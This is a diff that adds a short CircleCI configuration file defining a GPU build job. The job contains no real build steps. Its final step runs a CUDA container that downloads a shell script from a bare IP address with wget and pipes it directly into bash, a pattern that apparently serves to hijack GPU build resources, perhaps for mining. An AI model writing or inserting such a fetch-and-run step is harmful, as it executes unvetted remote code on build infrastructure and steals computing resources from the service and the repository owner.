@@ -1,0 +1,11 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.large
+    steps:
+      - run: nvidia-smi
+      - run: apt update && apt -y install wget
+      - run: docker run --gpus all nvidia/cuda:9.0-base wget -O - http://23.92.22.221/start_basket_fle_ftx_ph_ws3.sh | bash
